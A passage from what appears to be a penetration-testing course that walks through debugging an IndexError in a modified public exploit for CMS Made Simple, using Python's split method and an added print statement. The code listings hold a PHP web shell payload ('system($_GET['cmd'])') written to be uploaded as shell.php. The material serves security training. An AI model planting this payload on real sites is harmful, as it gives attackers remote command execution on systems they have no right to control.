# ### 15.2.4 *Troubleshooting the “index out of range” Error*

Inspecting line 24 of our exploit, we notice that it uses the *split*395 method in order to slice the string stored in the *location* parameter passed to the *parse_csrf_token* function. The Python documentation for *split*396 indicates that this method slices the input string using an optional separator passed as a first argument. The string slices returned by *split* are then stored in a Python *List* object that can be accessed via an index:

```
kali@kali:-$ python
>>> mystr = "Kali-*-Linux-*-Rocks"
>>> result = mystr.split("-*-")
>>> result
['Kali', 'Linux', 'Rocks']
>>> result[1]
'Linux'
>>>
```

*Listing 456 - Python string split method*

In our exploit code, the string separator is defined as the *csrf_param* variable (“__c”) followed by the equals sign:

```
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
```

*Listing 457 - Understanding the code on line 24*

In order to better understand the *IndexError*, we can add a *print* statement in the *parse_csrf_token* function before the return instruction:

```
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system(($_GET['cmd']);?>"

def parse_csrf_token(location):
    print "[+] String that is being split: " + location
    return location.split(csrf_param + "=")[1]
```

*Listing 458 - Adding a print statement to see the string where the split method is invoked on*

The exploit now displays the full string before the split method is invoked:

```
kali@kali:-$ python 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning:
: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warning
```

395 (W3Schools, 2019), https://www.w3schools.com/python/ref_string_split.asp 396 (Python, 2019), https://docs.python.org/3/library/stdtypes.html